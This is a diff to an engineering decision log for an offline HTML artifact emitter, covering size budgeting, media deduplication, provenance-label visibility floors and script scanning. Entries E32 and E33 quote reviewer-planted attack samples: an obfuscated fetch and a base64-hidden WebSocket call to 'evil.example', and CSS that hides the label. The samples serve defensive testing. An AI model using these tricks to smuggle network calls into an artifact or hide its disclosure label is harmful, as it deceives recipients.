@@ -31,7 +31,9 @@ section cannot drift from the file.
   <div id="pp-stage-root" data-pp-prerendered> … THE OPENING BEAT, AS HTML … </div>
   <noscript><p class="pp-noscript">…</p></noscript>
   <script id="pp-model"    type="application/octet-stream">{base64 payload}</script>
-  <script id="pp-media"    type="application/octet-stream">{one data: URI per line}</script>
+  <script id="pp-media"    type="application/octet-stream">{one entry per line: a data: URI,
+                                                            or `@src` for one the opening beat
+                                                            already carries — see E31}</script>
   <script id="pp-manifest" type="application/json">{generator, schemaVersion, proofId, compression}</script>
   <script id="pp-runtime">  … the bundled artifact runtime (src/artifact.js) … </script>
   <script id="pp-boot">     … decode + PitchProofRuntime.boot(…) …            </script>
@@ -48,9 +50,15 @@ The order **is** the §12 cold-boot budget written as markup:
    attribute and adopts the markup rather than replacing it, so the artifact
    never flashes.
 3. The payloads sit *after* the stage root, so nothing about them delays the
-   paint. They are inert: a `<script>` with a non-executable type is data.
+   paint. They are inert: a `<script>` with a non-executable type is data. A
+   media entry the opening beat already paints is a back-reference rather than a
+   second copy of the picture (E31): the lending element carries
+   `data-pp-m="<line index>"` and the line names the attribute to read it from.
 4. The runtime, then the boot script, which reassembles the model and makes the
    keyboard work.
+
+Those five `<script>` elements are the only ones an artifact may contain, and
+`scanForeignScripts` refuses a sixth (E33).
 
 Measured on the fixture proof, from `file://` in headless Chromium with the
 network blocked: **first contentful paint 80–88ms against the 1500ms budget**.
@@ -786,3 +794,282 @@ nothing, so a request that got past the route handler still could not resolve.
 attempted (the document); 0 page errors; 0 console errors; first contentful
 paint 80–88ms against 1500ms; 103 key presses over 21 deck positions with no
 divergence, in both variants.
+
+---
+
+## E30 — The size budget counts the bytes the file has, not the bytes the model has (C2)
+
+**Unsettled by:** §13 says "compute the byte cost of every asset" and §22.5 puts
+a ceiling on the file. Neither says which of the two numbers "byte cost" is, and
+they are not the same number.
+
+**Decision.** An asset's cost is **`copies × utf8Length(dataUri)`, where `copies`
+is counted in the document that was actually built**. `assetFootprint(html,
+assets)` does the counting, and `emit()` calls it after every build:
+
+```
+reserveBytes + assetBytes === utf8Length(html)      always, by measurement
+```
+
+`reserveBytes` is therefore the document's real fixed cost — the runtime bundle,
+the model payload, the stylesheet, the markup — and `maxBytes - reserveBytes` is
+really what is left for pictures. The copy counts go to `budgetAssets` as
+`options.copies`, so the greedy allocator stops when the *file* fits and every
+`DegradationLine` carries what the *file* saved. `EmitResult.budget` publishes
+all four numbers so a caller can check the arithmetic rather than trust it.
+
+**Why.** The previous reserve was `built.bytes - Σ collectAssets(...).bytes`,
+which is wrong twice over. `collectAssets` yields one entry per `MediaRef`, so a
+picture a specimen and its rendition share was subtracted twice; and the
+pre-rendered opening beat writes every payload it paints a second time, which
+was not subtracted at all. On a corpus proof with a 1.34MB hero on scene 1:
+
+```
+                                    before        after
+file                             3,070,806    1,743,322
+reserve the emitter computed       386,602      403,738   (measured, not inferred)
+true non-asset overhead            394,948      403,738
+asset bytes the file spends      2,675,862    1,339,584
+budget of exactly the file size    REFUSED          met
+```
+
+Three things rode on the bad number and all three were wrong. It **refused
+budgets it could meet** — `maxBytes` equal to the artifact's own size came back
+as a severity-1 `SIZE_BUDGET_EXCEEDED`. It **degraded further than it needed
+to**, because the assets looked half their real size against a reserve that was
+megabytes heavy. And the report a seller reads **understated the saving by
+exactly the number of duplicated copies**, which on hero images is 2×. That last
+one is the same defect as F13 in a different place: a report that is not about
+the file.
+
+Measured now, same proof, at five budgets (R = reserve, A = the natural asset
+spend):
+
+```
+budget      maxBytes    file        reserve+assets   reported saved   actual saved
+N          1,743,322   1,743,322    = file                    0              0
+N-1        1,743,321   1,743,282    = file                   44             44
+R+0.90A    1,609,363   1,078,654    = file              664,688        664,688
+R+0.75A    1,408,426   1,078,654    = file              664,688        664,688
+R+0.60A    1,207,488   1,078,654    = file              664,688        664,688
+R+0.45A    1,006,550     709,162    = file            1,034,176      1,034,176
+```
+
+`test/emit/budget.test.mjs` asserts all of it against the emitted string — the
+copy counts are recounted independently, and the model they are counted against
+is decoded back out of the artifact rather than taken from the proof that went
+in.
+
+**What this deliberately does not do.** An asset the document never writes out
+literally — anything `splitMedia` leaves in the model because it is shorter than
+`MEDIA_PLACEHOLDER_FLOOR` or is not base64, such as `data:image/svg+xml,<svg…>` —
+gets a copy count of **zero** and is not offered to the ladder. Its bytes are
+real and they are counted, in the reserve, where they are. They are not a line
+item because the emitter cannot measure a per-asset saving on them: they travel
+inside the deflate stream, interleaved with the whole model, and a line claiming
+such an asset gave back its full uncompressed length would be off by the
+compression ratio. When the budget is missed, they are named in `undegradable`
+with that reason rather than passed over in silence. Before this, they were
+budgeted as if degrading them saved their entire literal length, which was the
+same kind of fiction in the other direction.
+
+---
+
+## E31 — The opening beat's pictures are written into the file once (C2)
+
+**Unsettled by:** §12 requires the first scene to be in the document as static
+markup so it paints before JavaScript. D6 requires every payload in the media
+table so the runtime can rebuild the model. Nothing says what to do when those
+two requirements are about the same megabyte.
+
+**Decision.** The markup keeps the payload — it has to, an `<img>` needs a real
+`src` — and the media table borrows it back. `hoistFirstPaintMedia` marks the
+lending element `data-pp-m="<table index>"` and writes `@src` (or `@poster`,
+`@href`, `@data`) on that table line instead of the data URI.
+`ppReadMediaTable` resolves those at boot, before the runtime touches the stage,
+and throws if the markup cannot answer — a model still holding `@m7` where a
+picture belongs would render a broken image and, on an engine that resolves it
+as a relative URL, would put a network request in an artifact whose whole
+promise is that it makes none.
+
+**Why.** E30 makes the double-copy *reported* honestly. It does not make it
+stop, and §13 spends one budget: an artifact carrying every hero image twice is
+paying for the mistake as well as mis-reporting it. Measured:
+
+```
+proof                                   before        after      saving
+corpus proof (real pipeline)           618,275      614,693       3,582
+emitProof({imageEdge: 200}) fixture  1,018,828      804,176     214,652   (21.1%)
+corpus proof with a 1.34MB hero      3,078,782    1,742,508   1,336,274   (43.4%)
+```
+
+The cost is `ppReadMediaTable` in the boot script, about 1.1KB, paid whether or
+not anything is borrowed. It is paid back by the first picture on the first
+scene, and the opening beat of a proof is a screenshot roughly always.
+
+**Deliberate limits.** Only the *first* element to carry a payload lends it: two
+`<img>` tags showing the same picture both need a real `src`, so the second copy
+is a cost the markup genuinely has and `assetFootprint` charges it. Nothing
+inside `<svg>` lends, because `getAttribute('xlink:href')` depends on how the
+document was parsed and an artifact that cannot read one payload back has a hole
+in its model. Nothing inside a `raw` VNode lends, because the emitter does not
+know what element the payload sits on. In each of those cases the payload is
+written twice and the budgeter says so.
+
+**Proved where it matters.** `scripts/verify-offline.mjs` now reads the booted
+runtime's model in real Chromium and asserts every `MediaRef.dataUri` is a
+`data:` URI — 18 of 18 on the corpus artifact, in both the platform-decompression
+and the no-`DecompressionStream` variant. The unit tests drive the artifact's own
+`ppReadMediaTable` rather than a second implementation of it.
+
+---
+
+## E32 — The label's size floor is a measurement, not a list of declarations (C9)
+
+**Unsettled by:** §18.1 says the label "cannot be styled to invisibility
+(contrast and size floors enforced at emit)". It does not say what a size floor
+is measured on.
+
+**Decision.** `judgeLabelRoom` computes three things off the cascade and judges
+those:
+
+1. the **line box** the label's own `font-size` and `line-height` produce, and
+   the tightest resolvable `height`/`max-height` on any element from `<html>`
+   down to the label. A box shorter than one line **on an element that clips its
+   own content** is the label hidden;
+2. the tightest resolvable `width`/`max-width`, against a floor of
+   `LABEL_MIN_WIDTH_EM` (6) times the font size, on the same condition;
+3. **tracking** — `letter-spacing` and `word-spacing`, resolved to pixels
+   against the size they apply at, floored at `LABEL_MIN_TRACKING_EM` (-0.1em).
+
+And the §18.1 font floor is applied to the size the label is *painted* at:
+`fontSizePx × Π(scale factors on the chain)`, reading `transform: scale…`, the
+`scale` property and `zoom`.
+
+**Why.** The first version answered a list: `display:none`, `visibility:hidden`,
+`opacity:0`, `clip`, `clip-path`, off-screen position, `text-indent`,
+`transform:scale(0)`, and `width`/`height` equal to the literal string `0`. It
+refused thirteen of the §20 critic's eighteen stylesheets through both
+`deps.userCss` and `deps.themeCss`, and two walked through:
+
+```css
+.pp-provenance{height:1px!important;overflow:hidden!important}   /* 313×22 → 313×6  */
+.pp-provenance{letter-spacing:-1em!important}                    /* 313×22 → 19×22  */
+```
+
+Neither is a new idea. `height:1px` is `height:0` with a typo, and a list of
+literal values is always one property behind whoever writes the stylesheet.
+Measuring the box in pixels against the text that has to fit in it is a floor the
+next spelling has to clear rather than avoid, and it subsumes `height:0`,
+`max-height:0.2em`, `width:8px` and `scale(0.2)` without naming any of them.
+
+**Where the line is drawn, and why.**
+
+- **Clipping is judged on the element that declares the small box, never across
+  the chain.** A one-pixel label inside a clipping stage still shows its text:
+  the text spills out of the label, and the stage clips at the stage's own edge,
+  which is nowhere near it. Pairing the two per element is what lets
+  `.pp-provenance{height:1px}` alone pass — it is ugly, not invisible — while
+  `.pp-provenance{height:1px;overflow:hidden}` is refused. The runtime's own
+  `.pp-stage{overflow:hidden}` and `.pp-scene{overflow-x:hidden}` therefore
+  cannot make every short box on the page an attack.
+- **`overflow: auto` and `scroll` are not clipping.** A short scroll box leaves
+  the label reachable. `hidden` and `clip` do not.
+- **A dimension whose pixels depend on layout is not judged at all.**
+  `resolveLengthPx` returns `null` for `%`, `auto`, `calc()` and the intrinsic
+  keywords, and `null` means "this one says nothing", not "this one is fine".
+  The emitter does not lay the document out, and a law resting on a guess is
+  worse than no law. Viewport units resolve against the smallest breakpoint the
+  product supports (390×844), which is the smallest the box can ever be.
+- **-0.1em is the tracking floor** because real typography reaches about -0.05em
+  on display sizes and stops. At -0.1em glyphs begin to touch; `-1em` stacks
+  every character on the one before it.
+- **6em is the width floor** because at the 11px font floor that is 66px, about
+  eleven characters of a fifty-character sentence. A genuinely narrow column
+  clears it; a nineteen-pixel smear does not.
+
+`test/emit/provenance.test.mjs` asserts the two survivors are refused through
+both `deps.userCss` and `deps.themeCss`, adds six more spellings of the same two
+ideas, and asserts nine pieces of legitimate styling are **not** refused — a size
+law that refuses `height:24px;overflow:hidden` is a law nobody can ship under.
+
+**Measured.** All eighteen of the critic's stylesheets, run through `emit()`
+against the fixture proof, through `deps.userCss` and `deps.themeCss` in turn:
+**36 refusals out of 36.** Previously 26 of 36.
+
+The finding is filed at severity 3 by the critic because no product path passes
+either stylesheet today. It is fixed now rather than when one does, because L12
+is being asked to start passing `themeCss`.
+
+---
+
+## E33 — No base64 pass over inline script; the artifact carries no script the emitter did not write (C16)
+
+**Unsettled by:** §18.4 requires "no network, verified at emit". It does not say
+how far the verification chases obfuscation.
+
+**Decision, part one — the thing not done.** The scanner does **not** decode
+base64 string literals and rescan them. The §20 critic planted twenty-seven
+network references and the scanner caught twenty-six, including
+`window["fe"+"tch"]("htt"+"ps://evil.example/x")`. The miss was:
+
+```js
+new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))
+```
+
+A base64 pass would catch exactly this and nothing adjacent to it. Hex escapes,
+`String.fromCharCode`, `unescape`, ROT13, a two-character XOR and a lookup table
+built at runtime are all equally available and all equally undetectable by
+pattern, so the rule buys one member of an unbounded set. Against that, the
+false-positive cost is real and lands in the wrong place: `atob` is a function
+**the artifact's own decoder calls**, base64 literals decode to text that
+contains URLs in legitimate cases (a JWT payload names an issuer), and refusing
+an emit at severity 1 on a decoded string that was never a destination is the
+kind of rule that gets an override flag proposed for it — and §14 does not have
+one.
+
+**Decision, part two — what was done instead.** `scanForeignScripts` reports, at
+severity 1, any `<script>` in the emitted document that is not one of the five
+the emitter writes (`pp-model`, `pp-media`, `pp-manifest` inert; `pp-runtime`,
+`pp-boot` executable), with the `type` each is written with, and any duplicate of
+one. In a rendered scene the allowed set is empty: a scene renders content, and
+content that renders a `<script>` is content that runs.
+
+**Why this is the right shape.** The reason the scanner has to read inline
+script at all is that prospect-supplied markup could become executable code in
+the artifact. Refusing to carry that code answers the whole class at once, and
+answers it the same way whatever the payload is spelled like — the question of
+what `atob("V2ViU29ja2V0")` decodes to never has to be asked, because the
+element it arrived in is not one the emitter writes. It is also cheap, and it
+cannot fire on the artifact's own runtime, because the artifact's own runtime is
+the thing it is defined against.
+
+Reported as `NETWORK_REFERENCE` because that is §18.4's code and this is §18.4's
+law. §4 fixes the set of codes; inventing a fourteenth to describe one route to
+the same failure would help nobody reading the report.
+
+**Reachability, honestly.** No layout in the closed set renders a `raw`
+ContentBlock as raw HTML today, so the path is not live — the critic said so and
+`test/emit/scanner.test.mjs` confirms the fixture layouts drop it. The test
+therefore registers a fixture layout that *does* render raw blocks and drives the
+critic's own payload through `emit()`, because a law that holds only because
+nobody has exercised the path is not a law.
+
+---
+
+## E34 — `ppReadMediaTable` is a serialized function, not inline boot code
+
+**Unsettled by:** nothing in the spec; a consequence of E31.
+
+**Decision.** The media table reader is a named export of
+`src/emit/artifact-runtime.js`, serialized into the boot script by
+`artifactRuntimeSource` alongside `ppBase64ToBytes` and `ppRehydrateMedia`, and
+counted in both compression variants.
+
+**Why.** The module's opening comment already says why every other function
+there is written this way: what ships is exactly what is tested. Writing the
+`@src` resolution inline inside `ppBootArtifact` would have put the one piece of
+new boot-time logic in the one place ordinary tests cannot reach, and the test
+fixture that decodes an artifact's model (`test/fixtures/emit/artifact-dom.mjs`)
+calls the real function against a five-line document stub rather than
+re-implementing the rule it is checking.
